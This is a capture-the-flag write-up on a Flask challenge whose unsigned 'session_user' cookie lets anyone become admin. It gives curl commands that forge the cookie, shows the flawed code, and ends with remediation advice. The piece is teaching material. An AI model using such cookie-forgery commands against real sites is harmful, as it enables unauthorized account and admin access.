```markdown
# Authentication Bypass via Unsigned Cookies

## Challenge Description
Web application with login system that improperly validates user sessions through unsigned cookies, allowing authentication bypass.

## Vulnerability Analysis
**Type**: Broken Authentication  
**Root Cause**: Unsigned session cookies with no server-side validation  
**Location**: Cookie handling in `challenge_get()` function

## Exploitation Methods

### Direct Attack (Recommended)
```bash
curl -b "session_user=admin" "http://challenge.localhost/"
```

### Via Guest Login (Alternative)
1. First authenticate as guest:
   ```bash
   curl -X POST -d "username=guest&password=password" http://challenge.localhost/
   ```
2. Then modify the cookie:
   ```bash
   curl -b "session_user=admin" http://challenge.localhost/
   ```

## Technical Explanation

1. **Admin Credentials**:
   - Randomly generated (`os.urandom(8)`)
   - Impossible to guess or brute-force

2. **Cookie Mechanism**:
   ```python
   # Sets insecure cookie
   response.set_cookie('session_user', username)
   
   # Only checks cookie value
   username = flask.request.cookies.get("session_user")
   ```

3. **Security Flaws**:
   - Accepts any cookie value without validation
   - No cryptographic signing
   - No server-side session tracking
   - Superficial admin check (`if username == "admin"`)

## Impact
- Full authentication bypass
- Privilege escalation to admin
- Arbitrary user impersonation

## Remediation
1. **Use Flask's Secure Sessions**:
   ```python
   flask.session['user'] = username  # Automatically signed
   ```

2. **Server-Side Validation**:
   - Verify session against database
   - Implement proper session timeout

3. **Secure Cookie Attributes**:
   - Enable `HttpOnly`, `Secure`, and `SameSite` flags
   - Set proper expiration

## Lesson Learned
Never trust client-controlled values for authentication decisions without proper cryptographic validation and server-side checks.
```